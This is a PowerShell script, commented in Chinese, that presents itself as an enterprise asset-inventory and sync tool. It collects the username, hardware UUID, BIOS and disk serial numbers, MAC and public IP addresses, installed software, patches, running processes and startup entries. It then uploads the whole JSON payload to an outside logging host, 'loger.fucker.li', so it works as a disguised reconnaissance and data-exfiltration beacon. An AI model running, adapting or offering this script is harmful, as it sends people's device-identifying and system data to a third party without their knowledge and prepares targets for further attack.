# =========================================================================================
# 企业级资产全量自动化收集与同步脚本
# 支持：全系统软硬件深度扫描、多 API 公网 IP 轮询、全版本 TLS 协议兼容、大体积 JSON 投递
# =========================================================================================

# 1. 你的自定义接收地址
$url = "https://loger.fucker.li"

Write-Host "正在执行企业级全资产信息扫描 (含公网IP追踪)..." -ForegroundColor Cyan

# 封装安全获取 WMI/CIM 的函数，避免个别属性为空或无权限时导致整个脚本中断
function Get-SafeCim {
    param([string]$ClassName)
    try { return Get-CimInstance -ClassName $ClassName -ErrorAction Stop } catch { return $null }
}

# --- [ 0. 获取外网公网 IP ] ---
$publicIP = "未知 / 获取失败"
$ipAPIs = @("https://api.ipify.org", "https://ifconfig.me/ip")
foreach ($api in $ipAPIs) {
    try {
        # 设置 3 秒超时，防止因单个 API 响应慢导致脚本挂起
        $publicIP = (Invoke-RestMethod -Uri $api -TimeoutSec 3).Trim()
        if ($publicIP -match '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}') { break }
    } catch { continue }
}

# --- [ 1. 基础与系统信息 ] ---
$os = Get-SafeCim Win32_OperatingSystem
$computerSystem = Get-SafeCim Win32_ComputerSystem
$bios = Get-SafeCim Win32_BIOS
$motherboard = Get-SafeCim Win32_BaseBoard

# --- [ 2. 核心硬件深度扫描 ] ---
# CPU 核心与频率
$cpu = Get-SafeCim Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed

# 显卡/GPU 信息
$gpus = Get-SafeCim Win32_VideoController | ForEach-Object {
    @{ Name = $_.Name; DriverVersion = $_.DriverVersion; AdapterRAM_GB = [Math]::Round($_.AdapterRAM / 1GB, 2) }
}

# 物理内存插槽详情（容量、频率、厂家）
$ramSlots = Get-SafeCim Win32_PhysicalMemory | ForEach-Object {
    @{ Slot = $_.DeviceLocator; Capacity_GB = [Math]::Round($_.Capacity / 1GB, 2); Speed_MHz = $_.Speed; Manufacturer = $_.Manufacturer.Trim() }
}

# 物理硬盘详情（含序列号，用于资产防盗/防调换监控）
$physicalDisks = Get-SafeCim Win32_DiskDrive | ForEach-Object {
    @{ Model = $_.Model; Size_GB = [Math]::Round($_.Size / 1GB, 2); Interface = $_.InterfaceType; SerialNumber = $_.SerialNumber.Trim(); Status = $_.Status }
}

# 逻辑分区（所有盘符容量与剩余空间占用情况）
$logicalDisks = Get-SafeCim Win32_LogicalDisk | ForEach-Object {
    @{ DeviceID = $_.DeviceID; VolumeName = $_.VolumeName; Total_GB = [Math]::Round($_.Size / 1GB, 2); Free_GB = [Math]::Round($_.FreeSpace / 1GB, 2); DriveType = $_.DriveType }
}

# --- [ 3. 网络与外设 ] ---
# 过滤并捕获当前处于连接状态（Up）的物理网卡、MAC 与内网分配 IP
$networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" } | ForEach-Object {
    $ipInfo = Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4
    @{ Name = $_.Name; Description = $_.InterfaceDescription; MacAddress = $_.MacAddress; LocalIPAddress = $ipInfo.IPAddress }
}
$monitors = Get-SafeCim Win32_DesktopMonitor | Select-Object Name, MonitorManufacturer, MonitorType

# --- [ 4. 软件资产与系统环境 ] ---
# 全量枚举 64位和 32位注册表中的已安装软件清单
$uninstallPaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
$installedApps = Get-ItemProperty $uninstallPaths -ErrorAction SilentlyContinue | 
    Where-Object { $_.DisplayName -and $_.SystemComponent -ne 1 } | 
    Select-Object DisplayName, DisplayVersion, Publisher | 
    Sort-Object DisplayName

# 最近安装的系统高危修补程序 (Hotfixes)
$hotfixes = Get-SafeCim Win32_QuickFixEngineering | Select-Object HotFixID, InstalledOn, Description

# 正在运行的敏感进程清单（捕获前 20 个高资源消耗进程，用于排查异常占满情况）
$topProcesses = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 20 | ForEach-Object {
    @{ ProcessName = $_.ProcessName; Id = $_.Id; Memory_MB = [Math]::Round($_.WorkingSet / 1MB, 2) }
}

# 注册表/目录中配置的开机自启动项
$startupCommands = Get-SafeCim Win32_StartupCommand | Select-Object Name, Command, Location

# --- [ 5. 整合资产 Payload 结构体 ] ---
$payload = [PSCustomObject]@{
    Meta = @{
        ComputerName   = $env:COMPUTERNAME
        Username       = $env:USERNAME
        ReportTime     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        UUID           = (Get-SafeCim Win32_ComputerSystemProduct).UUID  # 设备的底层唯一硬件UUID
    }
    Network = @{
        Public_IP       = $publicIP       # 外网公网出口IP
        NetworkAdapters = $networkAdapters # 内网物理网卡拓扑
    }
    Hardware = @{
        BiosSerialNumber = $bios.SerialNumber.Trim()
        Motherboard     = @{ Manufacturer = $motherboard.Manufacturer; Product = $motherboard.Product }
        CPU             = $cpu
        GPUs            = $gpus
        RAM_Total_GB    = [Math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)
        RAM_Slots       = $ramSlots
        PhysicalDisks   = $physicalDisks
        LogicalDisks    = $logicalDisks
        Monitors        = $monitors
    }
    System = @{
        OS_Caption      = $os.Caption
        OS_Version      = $os.Version
        OS_Architecture = $os.OSArchitecture
        BootDevice      = $os.BootDevice
        LastBootTime    = $os.LastBootUpTime
    }
    Environment = @{
        InstalledApps   = $installedApps
        Hotfixes        = $hotfixes
        TopProcesses    = $topProcesses
        StartupCommands = $startupCommands
    }
}

# --- [ 6. 序列化与兼容性高保障发送 ] ---
# 由于采集信息深且庞大，深度（Depth）设为 6 层以保证嵌套关联数据不会断档
$jsonBody = ConvertTo-Json $payload -Depth 6
$utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonBody)

Write-Host "扫描完成。数据包大小: [ $([Math]::Round($utf8Bytes.Length / 1KB, 2)) KB ]，正在上传..." -ForegroundColor Cyan

try {
    # 强制启用全版本位掩码 TLS 支持，完美向下兼容旧版操作系统（如旧版 Win7/Server 2008）的 PowerShell 环境
    [Net.ServicePointManager]::SecurityProtocol = 192 -bor 768 -bor 3072 -bor 12288
    
    # 投递数据到后端
    $response = Invoke-RestMethod -Uri $url -Method Post -Body $utf8Bytes -ContentType "application/json; charset=utf-8"
    Write-Host "[成功] 数据已全量成功上传！" -ForegroundColor Green
} catch {
    Write-Host "[错误] 上传失败。具体原因: $_" -ForegroundColor Red
}
